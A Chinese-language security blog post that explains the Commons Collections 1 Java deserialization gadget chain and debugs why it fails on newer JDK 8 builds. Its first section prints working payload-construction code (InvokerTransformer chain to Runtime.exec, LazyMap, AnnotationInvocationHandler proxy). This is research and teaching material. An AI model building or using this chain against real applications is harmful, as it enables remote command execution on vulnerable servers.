---
layout:     post
title:      "调试分析CommonCollection1中的一个小问题"
subtitle:   ""
date:       2021-03-30 17:40:00
author:     "kuron3k0"
header-img: "img/home-bg-o.jpg"
tags:
    - Java
    - 反序列化
---

调CC1的时候脑子有个地方没转过弯来，这里做一下笔记

## CommonCollection1反序列化链

网上相关的分析文章有很多，这里就不详细展开了，大概过一下整个流程。

首先是构造Transformer链，用于后面到达漏洞点执行命令
```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", 
        new Class[] {String.class,Class[].class }, 
        new Object[] { "getRuntime",new Class[0] }),
    new InvokerTransformer("invoke", 
        new Class[] {Object.class,Object[].class }, 
        new Object[] { null, new Object[0] }),
    new InvokerTransformer("exec", 
        new Class[] { String.class},
        new String[] { "calc.exe" }),
};

Transformer transformerChain = new ChainedTransformer(transformers);

```

新建一个`LazyMap`，调用`LazyMap.get`即可触发`transformerChain`的命令执行
```java
Map innerMap = new HashMap();
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```

这里是`LazyMap.get`的源码，可以看到调用了`this.factory`（即之前传进来的`transformerChain`）的`transform`方法
```java
public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
```

而`AnnotationInvocationHandler`这个类的`invoke`方法会调用`this.memberValues.get`，`memberValues`是初始化的时候传进来的`LazyMap`
```java
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);
construct.setAccessible(true);
InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);
```

然后在这个`InvocationHandler`外面套一层动态代理，使其在调用任意方法的时候触发`invoke`函数，最后再包一层`InvocationHandler`用作反序列化
```java
Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[] {Map.class},handler);
handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);
```

## 高版本jdk的问题
但是这个payload在高版本jdk是利用不了的，看p神的文档说是因为`AnnotationInvocationHandler`的逻辑改了，具体可以看[这里](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d)

我调试的时候本地jdk是`1.8.0_271`，的确是利用不了的，但是当时看代码的时候觉得，既然这里`AnnotationInvocationHandler`调用了`memberValues`的`entrySet`，就会触发`invoke`方法，那为什么调用不了？虽然按上面说的逻辑变了，但是似乎对这个过程没什么影响？
![](/img/in-post/commoncollection1/1.png)

于是跟着进了`invoke`，发现`memberValues`变成了`LinkedHashMap`；，？？？
![](/img/in-post/commoncollection1/3.png)

翻了挺多文章也没看到具体是为什么失效了，都是说jdk版本高了，然后就利用不了了，这里卡了挺久的。后来突然发现`readObject`开头调用了`ObjectInputStream`的`readFields`方法（眼瞎。。），虽然没见过这个函数，但是大概猜的出来就是反序列化当前对象的属性

跟进`readFields`的源码可以看到的确是如此
```java
void readFields() throws IOException {
    bin.readFully(primVals, 0, primVals.length, false);

    int oldHandle = passHandle;
    ObjectStreamField[] fields = desc.getFields(false);
    int numPrimFields = fields.length - objVals.length;
    for (int i = 0; i < objVals.length; i++) {
        objVals[i] = readObject0(Object.class, fields[numPrimFields + i].isUnshared());
        objHandles[i] = passHandle;
    }
    passHandle = oldHandle;
}
```

调试中也看到了`AnnotationInvocationHandler`的`readObject`被调用了两次，很明显这个`AnnotationInvocationHandler`就是`memberValues`被初始化为`LazyMap`的那个
![](/img/in-post/commoncollection1/2.png)

但是在最后把`memberValues`赋值为一个新的`LinkedHashMap`，所以`LazyMap`就被替换掉了，利用失败。之前一直不清楚后面这两句`UnsafeAccessor`是怎么生效的，原来是在这里
![](/img/in-post/commoncollection1/4.png)



## 参考
[http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d)
[https://marcuseddie.github.io/2018/java-ObjectInputStream.html](https://marcuseddie.github.io/2018/java-ObjectInputStream.html)